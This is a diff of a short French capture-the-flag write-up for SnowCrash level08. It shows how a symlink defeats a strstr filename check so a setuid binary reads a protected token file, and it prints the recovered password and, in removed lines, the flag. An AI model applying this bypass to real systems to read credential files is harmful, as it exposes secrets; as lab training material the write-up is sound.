@@ -1,14 +1,12 @@
 
-strstr compare le mot pour voir si il passe le teste sauf que le nom de notre fichier et le mot interdit
-donc il faut faire un lien symbolique vers token sur un auter ficher 
+./level08 open le fichier passer en param
+le mot token est bloquer par strstr
+le fichier qui contient le token est strstre
+donc on fait un lien symbolique pour bypass
 
-level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/monlien
-level08@SnowCrash:~$ ./level08 /tmp/monlien
+ln -s /home/user/level08/token /tmp/monlien
+./level08 /tmp/monlien
 
 quif5eloekouj29ke0vouxean
 
-level08@SnowCrash:~$ su flag08
-Password: quif5eloekouj29ke0vouxean
-Don't forget to launch getflag !
-flag08@SnowCrash:~$ getflag
-25749xKZ8L7DkSCwJkT9dyv6f
+su flag08
